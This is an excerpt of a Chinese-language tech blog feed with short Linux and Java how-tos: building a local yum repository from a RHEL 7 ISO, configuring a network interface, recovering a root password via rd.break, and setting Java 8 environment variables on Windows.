    <content type="html"><![CDATA[<p>&#x79BB;&#x7EBF;&#x73AF;&#x5883;&#x73AF;&#x5883;&#x4E0B;&#x914D;&#x7F6E;&#x4E00;&#x4E2A;&#x672C;&#x5730;yum&#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#xFF0C;&#x7B80;&#x5355;&#x6574;&#x7406;&#x4E00;&#x4E0B;&#x3002;<br>Yum&#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x4E3A;&#x4E86;&#x8FDB;&#x4E00;&#x6B65;&#x7B80;&#x5316;RPM&#x7BA1;&#x7406;&#x8F6F;&#x4EF6;&#x7684;&#x96BE;&#x5EA6;&#x4EE5;&#x53CA;&#x81EA;&#x52A8;&#x5206;&#x6790;&#x6240;&#x9700;&#x8F6F;&#x4EF6;&#x5305;&#x53CA;&#x5176;&#x4F9D;&#x8D56;&#x5173;&#x7CFB;&#x7684;&#x6280;&#x672F;&#x3002;<br><a id="more"></a></p><h4 id="&#x7B2C;1&#x6B65;&#xFF1A;-&#x5207;&#x6362;&#x5230;-etc-yum-repos-d-&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#xFF08;yum&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x8DEF;&#x5F84;"><a href="#&#x7B2C;1&#x6B65;&#xFF1A;-&#x5207;&#x6362;&#x5230;-etc-yum-repos-d-&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#xFF08;yum&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x8DEF;&#x5F84;" class="headerlink" title="&#x7B2C;1&#x6B65;&#xFF1A; &#x5207;&#x6362;&#x5230;/etc/yum.repos.d/&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#xFF08;yum&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x8DEF;&#x5F84;)"></a>&#x7B2C;1&#x6B65;&#xFF1A; &#x5207;&#x6362;&#x5230;<code>/etc/yum.repos.d/</code>&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#xFF08;yum&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x8DEF;&#x5F84;)</h4><h4 id="&#x7B2C;2&#x6B65;&#xFF1A;-&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x968F;&#x610F;&#xFF0C;&#x4F46;&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x662F;-repo&#xFF09;"><a href="#&#x7B2C;2&#x6B65;&#xFF1A;-&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x968F;&#x610F;&#xFF0C;&#x4F46;&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x662F;-repo&#xFF09;" class="headerlink" title="&#x7B2C;2&#x6B65;&#xFF1A; &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x968F;&#x610F;&#xFF0C;&#x4F46;&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x662F;.repo&#xFF09;"></a>&#x7B2C;2&#x6B65;&#xFF1A; &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x968F;&#x610F;&#xFF0C;&#x4F46;&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x662F;<code>.repo</code>&#xFF09;</h4><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel_7 ~]# cd /etc/yum.repos.d/</span><br><span class="line">[root@rhel_7 yum.repos.d]# vi rhel7.repo</span><br><span class="line">[rhel7]</span><br><span class="line">name=rhel7</span><br><span class="line">baseurl=file:///media/cdrom</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br></pre></td></tr></tbody></table></figure><ul><li>[rhel7]    # yum&#x4ED3;&#x5E93;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x7B26;&#xFF0C;&#x907F;&#x514D;&#x4E0E;&#x5176;&#x4ED6;&#x4ED3;&#x5E93;&#x51B2;&#x7A81;&#x3002;</li><li>name=rhel7 # yum&#x540D;&#x79F0;&#x63CF;&#x8FF0;&#xFF0C;&#x6613;&#x4E8E;&#x8BC6;&#x522B;&#x4ED3;&#x5E93;&#x7528;&#x5904;&#x3002;</li><li>baseurl=file:///media/cdrom    # &#x63D0;&#x4F9B;&#x7684;&#x65B9;&#x5F0F;&#x5305;&#x62EC;FTP(ftp://..)&#x3001;HTTP(http://..)&#x3001;&#x672C;&#x5730;(file:///..)</li><li>enabled=1    # &#x8BBE;&#x7F6E;yum&#x662F;&#x5426;&#x53EF;&#x7528;&#xFF1B;1&#x53EF;&#x7528;&#xFF0C;0&#x7981;&#x7528;&#x3002;</li><li>gpgcheck=1    # &#x8BBE;&#x7F6E;yum&#x662F;&#x5426;&#x6821;&#x9A8C;&#x6587;&#x4EF6;&#xFF0C;1&#x6821;&#x9A8C;&#xFF0C;0&#x4E0D;&#x6821;&#x9A8C;&#x3002;</li><li>gpgkey=file:///media/cdrom/RPM-GPG-KEY-rehat-release    # &#x82E5;<code>gpgcheck</code>&#x5F00;&#x542F;&#xFF0C;&#x987B;&#x6307;&#x5B9A;&#x516C;&#x94A5;&#x6587;&#x4EF6;&#x5730;&#x5740;</li></ul><h4 id="&#x7B2C;3&#x6B65;&#xFF1A;&#x521B;&#x5EFA;&#x672C;&#x5730;&#x8F6F;&#x4EF6;&#x4ED3;"><a href="#&#x7B2C;3&#x6B65;&#xFF1A;&#x521B;&#x5EFA;&#x672C;&#x5730;&#x8F6F;&#x4EF6;&#x4ED3;" class="headerlink" title="&#x7B2C;3&#x6B65;&#xFF1A;&#x521B;&#x5EFA;&#x672C;&#x5730;&#x8F6F;&#x4EF6;&#x4ED3;"></a>&#x7B2C;3&#x6B65;&#xFF1A;&#x521B;&#x5EFA;&#x672C;&#x5730;&#x8F6F;&#x4EF6;&#x4ED3;</h4><p>&#x6302;&#x8F7D;ISO&#x955C;&#x50CF;&#x6216;&#x8005;&#x4E0A;&#x4F20;&#x5230;&#x672C;&#x5730;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel_7 ~]&amp; mkdir -p /media/cdrom</span><br><span class="line">[root@rhel_7 ~]&amp; mount -t iso9660 -o loop /usr/local/src/RHEL-server-7.0-x86_64.iso /media/cdrom</span><br><span class="line">[root@rhel_7 ~]&amp; vim /etc/fstab</span><br><span class="line">/usr/local/src/RHEL-server-7.0-x86_64.iso /media/cdrom iso9660 defaults,ro.loop 0 0</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;离线环境环境下配置一个本地yum软件仓库，简单整理一下。&lt;br&gt;Yum软件仓库的作用是为了进一步简化RPM管理软件的难度以及自动分析所需软件包及其依赖关系的技术。&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="RedHat" scheme="https://marnm.github.io/tags/RedHat/"/>
    
      <category term="yum" scheme="https://marnm.github.io/tags/yum/"/>
    
  </entry>
  
  <entry>
    <title>RedHat_7 配置网卡信息</title>
    <link href="https://marnm.github.io//posts/eb7dbe25/"/>
    <id>https://marnm.github.io//posts/eb7dbe25/</id>
    <published>2018-08-07T06:24:44.000Z</published>
    <updated>2022-05-26T13:41:51.369Z</updated>
    
    <content type="html"><![CDATA[<p>&#xA0;&#xA0;&#x5982;&#x679C;&#x60A8;&#x5177;&#x5907;&#x4E00;&#x5B9A;&#x7684;&#x8FD0;&#x7EF4;&#x7ECF;&#x9A8C;&#x6216;&#x8005;&#x719F;&#x6089;&#x65E9;&#x671F;&#x7684;Linux&#x7CFB;&#x7EDF;&#xFF0C;&#x5219;&#x5728;&#x5B66;&#x4E60;RHEL 7&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x4E00;&#x4E9B;&#x4E0D;&#x5BB9;&#x6613;&#x63A5;&#x53D7;&#x7684;&#x5DEE;&#x5F02;&#x5316;&#x3002;&#x5728;RHEL 5&#x3001;RHEL 6&#x4E2D;&#xFF0C;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x7684;&#x524D;&#x7F00;&#x4E3A;<strong><code>eth</code></strong>&#xFF0C;&#x7B2C;1&#x5757;&#x7F51;&#x5361;&#x4E3A;<strong><code>eth0</code></strong>&#xFF0C;&#x7B2C;2&#x5757;&#x7F51;&#x5361;&#x4E3A;<strong><code>eth1</code></strong>&#xFF1B;&#x4EE5;&#x6B64;&#x7C7B;&#x63A8;&#x3002;<br>&#xA0;&#xA0;&#x800C;&#x5728;RHEL 7&#x4E2D;&#xFF0C;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x524D;&#x7F00;&#x5219;&#x4E3A;<strong><code>ifcfg</code></strong>&#x5F00;&#x5934;&#xFF0C;&#x7136;&#x540E;&#x52A0;&#x4E0A;&#x7F51;&#x5361;&#x540D;&#x79F0;&#x5171;&#x540C;&#x7EC4;&#x6210;&#x4E86;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x540D;&#x5B57;&#xFF0C;&#x4F8B;&#x5982;<strong><code>ifcfg-eno16777736</code></strong>&#x3001;<code>ifcfg-ens33</code>&#xFF1B;&#x597D;&#x5728;&#x9664;&#x4E86;&#x6587;&#x4EF6;&#x540D;&#x53D8;&#x5316;&#x5916;&#x4E5F;&#x6CA1;&#x6709;&#x5176;&#x4ED6;&#x5927;&#x7684;&#x533A;&#x522B;&#x3002;<br><a id="more"></a></p><h3 id="&#x7B2C;1&#x6B65;&#xFF1A;-&#x9996;&#x5148;&#x5207;&#x6362;&#x5230;-etc-sysconfig-network-scripts-&#x76EE;&#x5F55;&#x4E2D;&#xFF08;&#x5B58;&#x653E;&#x7740;&#x7F51;&#x5361;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;"><a href="#&#x7B2C;1&#x6B65;&#xFF1A;-&#x9996;&#x5148;&#x5207;&#x6362;&#x5230;-etc-sysconfig-network-scripts-&#x76EE;&#x5F55;&#x4E2D;&#xFF08;&#x5B58;&#x653E;&#x7740;&#x7F51;&#x5361;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;" class="headerlink" title="&#x7B2C;1&#x6B65;&#xFF1A; &#x9996;&#x5148;&#x5207;&#x6362;&#x5230;/etc/sysconfig/network-scripts/&#x76EE;&#x5F55;&#x4E2D;&#xFF08;&#x5B58;&#x653E;&#x7740;&#x7F51;&#x5361;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;"></a>&#x7B2C;1&#x6B65;&#xFF1A; &#x9996;&#x5148;&#x5207;&#x6362;&#x5230;<strong><code>/etc/sysconfig/network-scripts/</code></strong>&#x76EE;&#x5F55;&#x4E2D;&#xFF08;&#x5B58;&#x653E;&#x7740;&#x7F51;&#x5361;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;</h3><h3 id="&#x7B2C;2&#x6B65;&#xFF1A;-&#x7F16;&#x8F91;&#x7F51;&#x5361;&#x6587;&#x4EF6;ifcfg-eno16777736"><a href="#&#x7B2C;2&#x6B65;&#xFF1A;-&#x7F16;&#x8F91;&#x7F51;&#x5361;&#x6587;&#x4EF6;ifcfg-eno16777736" class="headerlink" title="&#x7B2C;2&#x6B65;&#xFF1A; &#x7F16;&#x8F91;&#x7F51;&#x5361;&#x6587;&#x4EF6;ifcfg-eno16777736"></a>&#x7B2C;2&#x6B65;&#xFF1A; &#x7F16;&#x8F91;&#x7F51;&#x5361;&#x6587;&#x4EF6;<strong><code>ifcfg-eno16777736</code></strong></h3><ul><li><strong>&#x8BBE;&#x5907;&#x7C7B;&#x578B;&#xFF1A;</strong>TYPE=Ethernet</li><li><strong>&#x5730;&#x5740;&#x5206;&#x914D;&#x6A21;&#x5F0F;&#xFF1A;</strong>BOOTPROTO=static</li><li><strong>&#x7F51;&#x5361;&#x540D;&#x79F0;&#xFF1A;</strong>NAME=eno16777736</li><li><strong>&#x662F;&#x5426;&#x542F;&#x52A8;&#xFF1A;</strong>ONBOOT=yes</li><li><strong>IP&#x5730;&#x5740;&#xFF1A;</strong>IPADDR=192.168.1.10</li><li><strong>&#x5B50;&#x7F51;&#x63A9;&#x7801;&#xFF1A;</strong>NETMASK=255.255.255.0</li><li><strong>&#x7F51;&#x5173;&#x5730;&#x5740;&#xFF1A;</strong>GATEWAY=192.168.1.1</li><li><strong>DNS&#x5730;&#x5740;&#xFF1A;</strong>DNS1=114.114.114.114</li></ul><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[root@rhel_7 network-scripts]</span><span class="comment"># vim /etc/sysconfig/network-scripts/ifcfg-eno16777736</span></span><br><span class="line">TYPE=Ethernet</span><br><span class="line">BOTOPROTO=static</span><br><span class="line">NAME=eno16777736</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.1.74</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.1.1</span><br><span class="line">DNS1=114.114.114.114</span><br><span class="line">DNS2=192.168.1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">[root@rhel_7 network-scripts]</span><span class="comment"># systemctl restart network</span></span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;如果您具备一定的运维经验或者熟悉早期的Linux系统，则在学习RHEL 7时可能会遇到一些不容易接受的差异化。在RHEL 5、RHEL 6中，网卡配置的前缀为&lt;strong&gt;&lt;code&gt;eth&lt;/code&gt;&lt;/strong&gt;，第1块网卡为&lt;strong&gt;&lt;code&gt;eth0&lt;/code&gt;&lt;/strong&gt;，第2块网卡为&lt;strong&gt;&lt;code&gt;eth1&lt;/code&gt;&lt;/strong&gt;；以此类推。&lt;br&gt;&amp;nbsp;&amp;nbsp;而在RHEL 7中，网卡配置文件的前缀则为&lt;strong&gt;&lt;code&gt;ifcfg&lt;/code&gt;&lt;/strong&gt;开头，然后加上网卡名称共同组成了网卡配置文件的名字，例如&lt;strong&gt;&lt;code&gt;ifcfg-eno16777736&lt;/code&gt;&lt;/strong&gt;、&lt;code&gt;ifcfg-ens33&lt;/code&gt;；好在除了文件名变化外也没有其他大的区别。&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="RedHat" scheme="https://marnm.github.io/tags/RedHat/"/>
    
      <category term="rhel" scheme="https://marnm.github.io/tags/rhel/"/>
    
  </entry>
  
  <entry>
    <title>RedHat Linux重置root管理员密码</title>
    <link href="https://marnm.github.io//posts/32546aed/"/>
    <id>https://marnm.github.io//posts/32546aed/</id>
    <published>2018-08-05T07:48:25.000Z</published>
    <updated>2022-05-26T13:42:44.462Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p>&#x5E73;&#x65E5;&#x91CC;&#x8BA9;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x5934;&#x75BC;&#x7684;&#x4E8B;&#x60C5;&#x5DF2;&#x7ECF;&#x5F88;&#x591A;&#x4E86;&#xFF0C;&#x56E0;&#x6B64;&#x5076;&#x5C14;&#x628A;linux&#x7CFB;&#x7EDF;&#x7684;&#x5BC6;&#x7801;&#x5FD8;&#x8BB0;&#x4E86;&#x5E76;&#x4E0D;&#x7528;&#x614C;&#xFF0C;&#x53EA;&#x9700;&#x7B80;&#x5355;&#x51E0;&#x6B65;&#x5C31;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x5BC6;&#x7801;&#x7684;&#x91CD;&#x7F6E;&#x5DE5;&#x4F5C;&#x3002;</p><h2 id="&#x57FA;&#x4E8E;rhel&#x7248;&#x672C;"><a href="#&#x57FA;&#x4E8E;rhel&#x7248;&#x672C;" class="headerlink" title="&#x57FA;&#x4E8E;rhel&#x7248;&#x672C;"></a>&#x57FA;&#x4E8E;rhel&#x7248;&#x672C;</h2><p>RedHat&#x3001;CentOS&#x3001;<br><a id="more"></a></p><h3 id="&#x91CD;&#x542F;Linux&#x7CFB;&#x7EDF;&#x4E3B;&#x673A;&#x51FA;&#x73B0;&#x5F15;&#x5BFC;&#x754C;&#x9762;&#xFF0C;&#x6309;&#x4E0B;&#x952E;&#x76D8;&#x4E0A;&#x7684;E&#x952E;&#x8FDB;&#x5165;&#x5185;&#x6838;&#x7F16;&#x8F91;&#x754C;&#x9762;"><a href="#&#x91CD;&#x542F;Linux&#x7CFB;&#x7EDF;&#x4E3B;&#x673A;&#x51FA;&#x73B0;&#x5F15;&#x5BFC;&#x754C;&#x9762;&#xFF0C;&#x6309;&#x4E0B;&#x952E;&#x76D8;&#x4E0A;&#x7684;E&#x952E;&#x8FDB;&#x5165;&#x5185;&#x6838;&#x7F16;&#x8F91;&#x754C;&#x9762;" class="headerlink" title="&#x91CD;&#x542F;Linux&#x7CFB;&#x7EDF;&#x4E3B;&#x673A;&#x51FA;&#x73B0;&#x5F15;&#x5BFC;&#x754C;&#x9762;&#xFF0C;&#x6309;&#x4E0B;&#x952E;&#x76D8;&#x4E0A;&#x7684;E&#x952E;&#x8FDB;&#x5165;&#x5185;&#x6838;&#x7F16;&#x8F91;&#x754C;&#x9762;"></a>&#x91CD;&#x542F;Linux&#x7CFB;&#x7EDF;&#x4E3B;&#x673A;&#x51FA;&#x73B0;&#x5F15;&#x5BFC;&#x754C;&#x9762;&#xFF0C;&#x6309;&#x4E0B;&#x952E;&#x76D8;&#x4E0A;&#x7684;<code>E</code>&#x952E;&#x8FDB;&#x5165;&#x5185;&#x6838;&#x7F16;&#x8F91;&#x754C;&#x9762;</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx3.sinaimg.cn/mw690/006ALkzYly1ftyygehy83j30k00b474c.jpg" alt="boot-img" title="">                </div>                <div class="image-caption">boot-img</div>            </figure><h3 id="&#x5728;linux16-&#x53C2;&#x6570;&#x8FD9;&#x884C;&#x7684;&#x6700;&#x540E;&#x6DFB;&#x52A0;rd-break-&#x7136;&#x540E;&#x6309;&#x4E0B;Ctrl-X&#x8FD0;&#x884C;"><a href="#&#x5728;linux16-&#x53C2;&#x6570;&#x8FD9;&#x884C;&#x7684;&#x6700;&#x540E;&#x6DFB;&#x52A0;rd-break-&#x7136;&#x540E;&#x6309;&#x4E0B;Ctrl-X&#x8FD0;&#x884C;" class="headerlink" title="&#x5728;linux16 &#x53C2;&#x6570;&#x8FD9;&#x884C;&#x7684;&#x6700;&#x540E;&#x6DFB;&#x52A0;rd.break,&#x7136;&#x540E;&#x6309;&#x4E0B;Ctrl+X&#x8FD0;&#x884C;"></a>&#x5728;linux16 &#x53C2;&#x6570;&#x8FD9;&#x884C;&#x7684;&#x6700;&#x540E;&#x6DFB;&#x52A0;<code>rd.break</code>,&#x7136;&#x540E;&#x6309;&#x4E0B;<code>Ctrl</code>+<code>X</code>&#x8FD0;&#x884C;</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux16 /vmlinuz-3.10.0-123.e17.x86_64 root=UUID=039848c2-4663-4223-a7\</span><br><span class="line">52-e07bf143e52d ro rd.lvm.lv=rhel/root crashkernel=auto rd.lvm.lv=rhel/swap v\</span><br><span class="line">console.font=latarcyrheb-sun16 vconsole.keymap=us rhgb quiet LANG=en_US.UTF-8\</span><br><span class="line"> rd.break</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx2.sinaimg.cn/mw1024/006ALkzYly1ft8l939p1nj30l80armx6.jpg" alt="&#x7F16;&#x8F91;&#x5185;&#x6838;&#x754C;&#x9762;" title="">                </div>                <div class="image-caption">&#x7F16;&#x8F91;&#x5185;&#x6838;&#x754C;&#x9762;</div>            </figure><h3 id="&#x4FEE;&#x6539;&#x5BC6;&#x7801;"><a href="#&#x4FEE;&#x6539;&#x5BC6;&#x7801;" class="headerlink" title="&#x4FEE;&#x6539;&#x5BC6;&#x7801;"></a>&#x4FEE;&#x6539;&#x5BC6;&#x7801;</h3><p>&#x8F93;&#x5165;&#x4E0B;&#x9762;&#x8FD9;&#x4E9B;&#x547D;&#x4EE4;<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx4.sinaimg.cn/mw1024/006ALkzYly1ft8l8tkg45j30n80bx0sr.jpg" alt="&#x7F16;&#x8F91;&#x5982;&#x4E0B;&#x547D;&#x4EE4;" title="">                </div>                <div class="image-caption">&#x7F16;&#x8F91;&#x5982;&#x4E0B;&#x547D;&#x4EE4;</div>            </figure><p></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">switch_root:/# mount -o remount,rw /sysroot</span><br><span class="line">switch_root:/# chroot /sysroot</span><br><span class="line">sh-4.2# passwd</span><br><span class="line">&#x6B64;&#x5904;&#x7565;&#x8FC7;&#x5BC6;&#x7801;&#x8F93;&#x5165;&#x8FC7;&#x7A0B;...</span><br><span class="line">sh-4.2# touch /.autorelabel</span><br><span class="line">sh-4.2# exit</span><br><span class="line">sh-4.2# reboot</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x57FA;&#x4E8E;debian&#x7248;&#x672C;"><a href="#&#x57FA;&#x4E8E;debian&#x7248;&#x672C;" class="headerlink" title="&#x57FA;&#x4E8E;debian&#x7248;&#x672C;"></a>&#x57FA;&#x4E8E;debian&#x7248;&#x672C;</h2><h2 id="&#x57FA;&#x4E8E;slackware&#x7248;&#x672C;"><a href="#&#x57FA;&#x4E8E;slackware&#x7248;&#x672C;" class="headerlink" title="&#x57FA;&#x4E8E;slackware&#x7248;&#x672C;"></a>&#x57FA;&#x4E8E;slackware&#x7248;&#x672C;</h2><h2 id="&#x6700;&#x540E;"><a href="#&#x6700;&#x540E;" class="headerlink" title="&#x6700;&#x540E;"></a>&#x6700;&#x540E;</h2><p><a href="http://futurist.se/gldt/wp-content/uploads/12.10/gldt1210.svg" target="_blank" rel="noopener">Linux&#x884D;&#x751F;&#x7248;&#x672C;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;平日里让运维人员头疼的事情已经很多了，因此偶尔把linux系统的密码忘记了并不用慌，只需简单几步就可以完成密码的重置工作。&lt;/p&gt;
&lt;h2 id=&quot;基于rhel版本&quot;&gt;&lt;a href=&quot;#基于rhel版本&quot; class=&quot;headerlink&quot; title=&quot;基于rhel版本&quot;&gt;&lt;/a&gt;基于rhel版本&lt;/h2&gt;&lt;p&gt;RedHat、CentOS、&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="RedHat" scheme="https://marnm.github.io/tags/RedHat/"/>
    
  </entry>
  
  <entry>
    <title>Java8 环境变量配置</title>
    <link href="https://marnm.github.io//posts/295162d9/"/>
    <id>https://marnm.github.io//posts/295162d9/</id>
    <published>2018-08-03T15:34:01.000Z</published>
    <updated>2022-05-26T13:30:43.307Z</updated>
    
    <content type="html"><![CDATA[<p>&#x5982;&#x4F55;&#x5728;Windows&#x4E0B;&#x5B89;&#x88C5;&#x914D;&#x7F6E;Java&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;<br><a id="more"></a></p><h4 id="&#x6211;&#x7684;&#x73AF;&#x5883;"><a href="#&#x6211;&#x7684;&#x73AF;&#x5883;" class="headerlink" title="&#x6211;&#x7684;&#x73AF;&#x5883;"></a>&#x6211;&#x7684;&#x73AF;&#x5883;</h4><p>Windows 10<br>Java&#x7248;&#x672C;<code>1.8.0_161</code><br>&#x6211;&#x7684;&#x5B89;&#x88C5;&#x76EE;&#x5F55;<code>C:\Java\</code></p><h4 id="&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;"><a href="#&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;" class="headerlink" title="&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;"></a>&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;</h4><p>&#x6DFB;&#x52A0;&#x73AF;&#x5883;&#x53D8;&#x91CF;<br><code>JAVA_HOME</code> </p><blockquote><p>C:\Java\jdk1.8.0_161</p></blockquote><p><code>CLASSPATH</code></p><blockquote><p>.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</p></blockquote><p>&#x7F16;&#x8F91;<code>path</code></p><blockquote><p>%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin; </p></blockquote><h4 id="&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x53D8;&#x91CF;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;"><a href="#&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x53D8;&#x91CF;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;" class="headerlink" title="&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x53D8;&#x91CF;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;"></a>&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x53D8;&#x91CF;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://wx4.sinaimg.cn/mw690/006ALkzYgy1ftwy76xcljj30lg067dg4.jpg" alt="java and javac" title="">                </div>                <div class="image-caption">java and javac</div>            </figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>{</span><br><span class="line">System.out.println(<span class="string">&quot;Hello World, hello java !&quot;</span>);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>&#x4FDD;&#x5B58;&#x4E3A;<code>test.java</code><br>&#x7F16;&#x8BD1;<code>&#x6E90;&#x4EE3;&#x7801;</code><br><code>javac test.java</code><br><code>java test</code></p><h4 id="&#x6700;&#x540E;"><a href="#&#x6700;&#x540E;" class="headerlink" title="&#x6700;&#x540E;"></a>&#x6700;&#x540E;</h4><p><a 